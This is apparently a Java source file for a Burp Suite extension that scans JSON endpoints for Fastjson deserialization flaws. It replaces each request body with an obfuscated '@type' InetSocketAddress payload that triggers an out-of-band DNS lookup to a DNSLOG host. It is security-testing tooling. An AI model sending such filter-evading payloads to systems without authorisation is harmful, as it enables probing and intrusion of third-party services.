package jrcet.frame.Scanner.Fastjson;

import burp.*;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.headers.HttpHeader;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import jrcet.frame.Setting.Setting;
import jrcet.help.Helper;

import java.nio.charset.StandardCharsets;
import java.util.HashSet;
import java.util.List;
import java.util.Objects;

import static burp.MyExtender.*;

public class Fastjson {
    public static String DNSLOG = "";
    public static String TOKEN = "";

    private static final HashSet<String> url_set = new HashSet<>();

    private static String current_url;

    public static void doScan(HttpRequestResponse httpRequestResponse){

        if(!check(httpRequestResponse)) return;

        String randomString = Helper.createRandomString(8);
        String body =  ("\\ufeff{,/*aab*/,'x_' : {/*aab*/\"@type\":\"java.net.InetSocketAddress\"{\"address\":/*aab*/,/*aa\"b*/ \"val\" :\""+randomString+"."+DNSLOG+"\"}}}");

        HttpRequest httpRequest = httpRequestResponse.httpRequest();

        HttpRequest newHttpRequest=null;
//        newHttpRequest.withBody(body);
        httpRequest = httpRequest.withBody(body);
        if(Setting.DEBUG)api.logging().output().println(httpRequest.bodyAsString());
        httpRequestResponse = api.http().issueRequest(httpRequest);

        HttpResponse httpResponse = httpRequestResponse.httpResponse();
        if(Setting.DEBUG)api.logging().output().println(httpResponse.statusCode());
        url_set.add(current_url);
    }

    private static boolean check(HttpRequestResponse httpRequestResponse){
        current_url = httpRequestResponse.httpRequest().withPath("/").url();
        if(url_set.contains(current_url)) return false;

        List<HttpHeader> httpHeaders = httpRequestResponse.httpRequest().headers();
        for(HttpHeader httpHeader: httpHeaders){
            if(Objects.equals(httpHeader.name().toLowerCase(), "content-type") && Objects.equals(httpHeader.value().toLowerCase(), "application/json")){
                return true;
            }
        }
        return false;
    }

}
